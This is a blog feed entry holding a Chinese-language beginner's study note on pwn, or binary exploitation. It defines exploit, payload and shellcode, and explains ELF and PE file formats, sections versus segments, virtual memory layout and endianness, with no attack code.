            "content_html": "<h1 id=\"pwn学习笔记1\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记1\">#</a> pwn 学习笔记（1）</h1>\n<h2 id=\"1pwn简介\"><a class=\"markdownIt-Anchor\" href=\"#1pwn简介\">#</a> （1）pwn 简介：</h2>\n<pre><code>\t以下来自于百度百科：”Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 。\n</code></pre>\n<h2 id=\"2几个简单的名词\"><a class=\"markdownIt-Anchor\" href=\"#2几个简单的名词\">#</a> （2）几个简单的名词：</h2>\n<pre><code>\texploit：用于攻击的脚本与方案\n\n\tpayload：攻击载荷，是对目标进程劫持控制流的数据\n\n\tshellcode：调用攻击目标的shell代码，常见的有bash和sh\n</code></pre>\n<h2 id=\"3c源代码到可执行文件\"><a class=\"markdownIt-Anchor\" href=\"#3c源代码到可执行文件\">#</a> （3）C 源代码到可执行文件：</h2>\n<pre><code>\t如下图所示：\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/IrRs7DdMKH5i2be.png\" alt=\"\"></p>\n<pre><code>\tC源代码经过编译成为汇编代码，汇编代码再经过汇编成为机器码，即生成一个elf（二进制）目标文件，进行链接后成为elf可执行文件：\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/NLbaZoejBP1lyHd.png\" alt=\"\"></p>\n<h2 id=\"4可执行文件\"><a class=\"markdownIt-Anchor\" href=\"#4可执行文件\">#</a> （4) 可执行文件：</h2>\n<p>1.Windows：PE</p>\n<pre><code>可执行程序  .exe\n\n动态链接库  .dll\n\n静态链接库  .lib\n</code></pre>\n<p>2.Linux：ELF</p>\n<pre><code>可执行程序  .out\n\n动态链接库  .so\n\n静态链接库  .a\n</code></pre>\n<h2 id=\"5elf文件信息\"><a class=\"markdownIt-Anchor\" href=\"#5elf文件信息\">#</a> （5）ELF 文件信息：</h2>\n<pre><code>（1）段视图：在内存中程序加载到内存成为一个进程后，进行读写、执行权限划分的视图；节视图：是一个elf文件，存放在磁盘中，进行不同功能区域划分的视图\n\n（2）code节包含的内容是机器码。不同的分区有不同的功能，根据不同的功能被划分成不同的代码节。\n\n（3）不同的节可能属于一个段。多个节可以合并成一个段，段在elf文件加载到进程后起作用。\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/hQG4JDngTEmpskR.png\" alt=\"\"></p>\n<h2 id=\"6程序装在与虚拟内存\"><a class=\"markdownIt-Anchor\" href=\"#6程序装在与虚拟内存\">#</a> （6）程序装在与虚拟内存：</h2>\n<pre><code>\t硬盘中的ELF文件在启动的时候，会被装载到内存中形成一个虚拟映像，同时，ELF中相应的节会组合在一起成为一个个个段：\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/HtdbrK4Psmk2JuE.png\" alt=\"\"></p>\n<pre><code>\t对于32位的ELF文件，操作系统会在装载的时候分出4G的虚拟内存空间，同时，最高位地址那1G属于内核空间，用来存放一些内核的代码，而剩下的3G属于用户空间，用户空间是各自独立的，但内核空间是共享的，在物理内存中只需要存在一份即可\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/ovrHZ6SwsRGqn1a.png\" alt=\"\"></p>\n<pre><code>\t对于一个虚拟内存而言存在很多个段：\n\n\t1.Bss段：用于存放未初始化的全局变量，未初始化的全局变量占用内存空间，不占用磁盘空间\n\n\t2.Text段：存放只读不写的数据和函数\n\n\t3.Stack段：用于存放局部变量以及函数的栈帧\n</code></pre>\n<h2 id=\"7大端序与小端序\"><a class=\"markdownIt-Anchor\" href=\"#7大端序与小端序\">#</a> （7）大端序与小端序：</h2>\n<p><img data-src=\"https://s2.loli.net/2024/05/21/ncKRAiSZkhGf36B.png\" alt=\"\"></p>\n",
            "tags": [
                "Pwn"
            ]
        }
    ]
}